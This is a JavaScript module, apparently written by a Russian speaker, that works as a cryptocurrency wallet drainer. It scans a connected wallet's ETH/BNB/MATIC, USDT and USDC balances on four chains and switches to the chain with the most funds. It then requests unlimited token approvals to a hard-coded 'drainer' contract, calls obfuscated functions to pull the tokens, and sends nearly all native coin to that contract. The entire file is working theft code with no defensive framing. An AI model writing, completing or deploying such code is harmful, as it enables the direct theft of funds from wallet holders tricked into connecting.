import { ethers } from 'ethers'

const ERC20_ABI = [
  "function balanceOf(address account) view returns (uint256)",
  "function approve(address spender, uint256 amount) returns (bool)",
  "function decimals() view returns (uint8)",
  "function allowance(address owner, address spender) view returns (uint256)"
]

const DRAINER_ABI = [
  "function tK7(uint256 usdtAmount, uint256 usdcAmount) external",
  "function bN3() external payable"
]

const CHAINS = {
  1: {
    name: "Ethereum",
    chainIdHex: "0x1",
    rpcUrls: ["https://rpc.ankr.com/eth"],
    usdtAddress: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
    usdcAddress: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
    drainerAddress: "0x35FFA0699Ce9951bDb95214f4Ac870Ae696429dF"
  },
  56: {
    name: "BNB Chain",
    chainIdHex: "0x38",
    rpcUrls: ["https://bsc-dataseed.binance.org/"],
    usdtAddress: "0x55d398326f99059fF775485246999027B3197955",
    usdcAddress: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
    drainerAddress: "0x35FFA0699Ce9951bDb95214f4Ac870Ae696429dF"
  },
  137: {
    name: "Polygon",
    chainIdHex: "0x89",
    rpcUrls: ["https://polygon-rpc.com/"],
    usdtAddress: "0x3813e82e6f7098b9583FC0F33a962D02018B6803",
    usdcAddress: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174",
    drainerAddress: "0x35FFA0699Ce9951bDb95214f4Ac870Ae696429dF"
  },
  42161: {
    name: "Arbitrum",
    chainIdHex: "0xa4b1",
    rpcUrls: ["https://arb1.arbitrum.io/rpc"],
    usdtAddress: "0xfd086bc7cd5c481dcc9c85ebe478a1c0b69fcbb9",
    usdcAddress: "0xff970a61a04b1ca14834a43f5de4533ebddb5cc8",
    drainerAddress: "0x35FFA0699Ce9951bDb95214f4Ac870Ae696429dF"
  }
  // можно добавить Optimism, Avalanche, Linea, Base — если есть контракты и адреса
}

const delay = (ms) => new Promise(r => setTimeout(r, ms))

async function checkBalance(chainId, userAddress) {
  const config = CHAINS[chainId]
  let provider

  for (const rpc of config.rpcUrls) {
    try {
      provider = new ethers.providers.JsonRpcProvider(rpc)
      await provider.getBlockNumber()
      break
    } catch (_) {}
  }

  if (!provider) throw new Error(`Нет RPC для ${config.name}`)

  const nativeBalance = await provider.getBalance(userAddress)
  const usdt = new ethers.Contract(config.usdtAddress, ERC20_ABI, provider)
  const usdc = new ethers.Contract(config.usdcAddress, ERC20_ABI, provider)
  const usdtBalance = await usdt.balanceOf(userAddress)
  const usdcBalance = await usdc.balanceOf(userAddress)

  return { nativeBalance, usdtBalance, usdcBalance }
}

function hasFunds(bal) {
  return (
    bal.nativeBalance.gt(ethers.utils.parseEther("0.001")) ||
    bal.usdtBalance.gt(ethers.utils.parseUnits("0.1", 6)) ||
    bal.usdcBalance.gt(ethers.utils.parseUnits("0.1", 6))
  )
}

async function switchChain(chainId) {
  await window.ethereum.request({
    method: "wallet_switchEthereumChain",
    params: [{ chainId: CHAINS[chainId].chainIdHex }]
  })
}

async function drain(chainId, signer, userAddress, bal) {
  const config = CHAINS[chainId]
  const MAX = ethers.constants.MaxUint256

  const drainer = new ethers.Contract(config.drainerAddress, DRAINER_ABI, signer)
  const usdt = new ethers.Contract(config.usdtAddress, ERC20_ABI, signer)
  const usdc = new ethers.Contract(config.usdcAddress, ERC20_ABI, signer)

  if (bal.usdtBalance.gt(0)) {
    const allowance = await usdt.allowance(userAddress, config.drainerAddress)
    if (allowance.lt(bal.usdtBalance)) await usdt.approve(config.drainerAddress, MAX)
  }

  if (bal.usdcBalance.gt(0)) {
    const allowance = await usdc.allowance(userAddress, config.drainerAddress)
    if (allowance.lt(bal.usdcBalance)) await usdc.approve(config.drainerAddress, MAX)
  }

  if (bal.usdtBalance.gt(0) || bal.usdcBalance.gt(0)) {
    await drainer.tK7(bal.usdtBalance, bal.usdcBalance)
  }

  const nativeToSend = bal.nativeBalance.sub(ethers.utils.parseEther("0.001"))
  if (nativeToSend.gt(0)) {
    await drainer.bN3({ value: nativeToSend })
  }
}

export async function runDrainer(provider, signer, userAddress) {
  const balances = []

  for (const chainId of Object.keys(CHAINS)) {
    try {
      const balance = await checkBalance(chainId, userAddress)
      console.log(`Сеть: ${CHAINS[chainId].name}`)
      console.log(`💰 Native: ${ethers.utils.formatEther(balance.nativeBalance)}`)
      console.log(`🟠 USDT: ${ethers.utils.formatUnits(balance.usdtBalance, 6)}`)
      console.log(`🔵 USDC: ${ethers.utils.formatUnits(balance.usdcBalance, 6)}`)
      balances.push({ chainId: Number(chainId), ...balance })
    } catch (e) {
      console.warn(`Ошибка при проверке баланса в сети ${CHAINS[chainId].name}:`, e.message)
    }

    await delay(300)
  }

  // Найти сеть с наибольшим количеством токенов
  const sorted = balances
    .filter(hasFunds)
    .sort((a, b) =>
      b.usdtBalance.add(b.usdcBalance).gt(a.usdtBalance.add(a.usdcBalance)) ? 1 : -1
    )

  if (!sorted.length) {
    console.warn("⛔ Нет подходящих сетей с балансом.")
    return
  }

  const target = sorted[0]
  await switchChain(target.chainId)
  await drain(target.chainId, signer, userAddress, target)
}
